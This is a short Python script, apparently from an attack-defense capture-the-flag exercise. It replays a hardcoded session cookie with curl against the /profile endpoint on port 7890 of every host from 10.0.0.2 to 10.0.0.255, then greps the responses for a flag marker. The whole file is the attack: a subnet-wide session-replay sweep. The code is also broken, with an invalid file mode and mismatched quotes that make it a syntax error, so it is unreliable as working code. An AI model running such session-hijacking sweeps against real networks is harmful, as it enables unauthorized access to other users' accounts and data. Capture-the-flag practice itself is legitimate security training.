import os
CO = "curl -v --cookie "
PA = "buggy-cookie=MTU5NTEwMjE3M3xybTZKMVNldXNfNzVmcjIySFRxMXlYdVRMZ1RsVFdIQ0Z5Zzl5aDhmVkxwT3hpQzNQR1hpR0w5bk9LUnVCbE00dkwwOFJCdkMyNUsxRlVxMlNCLTRyMFN0c0JFalZvTVVDOTAyQjhQZEd5d1c1c0QzRklnN2hjZW9BZmxtX01ZM1JYWXV3WFdfSl9uZmFiNUd1VEpCVG5LU0NMYklralp1UEhyXzRDNlg0SU5BZW0tRXYtY2F1TGp6VGN4aUFIZUpWNzFtNXdwYUlYaURvVVozalptdkJpNW1nd2JYTlhpd0FRTmZ6YjctaHU5LTBoaDhDckxoanpQTDVCSGF4YVdMeHYyUVg3SmFYVUdNSUZRdy1QNktudjVpNS1MQ2MzNlhubnhWXzVXS2V4eWZsNTdGclYwWXJDTUg5d1Y2S1Q1amdkdHFfb0xLcDFHN19lbFZTSzdXTXZiY0pwcVAwdVMzVGlBSmRDMHRld1hkMzJtUXRBNzluY1RUQmFOdG03UlBfWElpZVpGYl9KNE9VdVJNblFqd2haTU1la2V0ZXo0WVhqcW43RFpxeXUtNmN5OUw5RDFFaG1XQkU1eXVtdmFnaHo1ZFh0S0pVSzJraWRrSHhYdW5HeTZJWEhrS05sNkR5Y3dja3R5ZjlsRFVyOVN2QXNEM3dYa3k2d3N0QWwzYkhuSlItWkZNeVN5Zk9TYmFHZ3hnSzE4ZGZaZ3RXNTVZOGFYRjdOU2xEZnMzejZCNXdKZEFDeVNsNTFJU2k3Z25hRXdoeTlIanhOUk9aRC1HdmR4VmxGNlV1Tm92MDBCMlI1SjlFbkJrWVJobmhPQ2FNVE5hMXZjQ1J1Sl8tWmZHNlR6eF9PSGJEQUp5UUN5MmVKMlRnTF83VUN4ZUJTXzN1U0xENWZwdDByTlM5M1FOQmU4YVJEdmkzLXE4cXlpZWlHSXZwVVhuYVdJaDMzZFdzcXM9fOGvvjF7ytdAwwOhgty-5nQNfbmXAKNH-lPl_Fly-jEN"
f= open('flag',"rw")
for i in range(2,256,1):
	ip= "10.0.0."
	ip = ip + str(i)

	print(os.system("{} {} http://{}:7890/profile | grep "🌈"  | tail -1".format(CO,PA,ip)))		
f.close()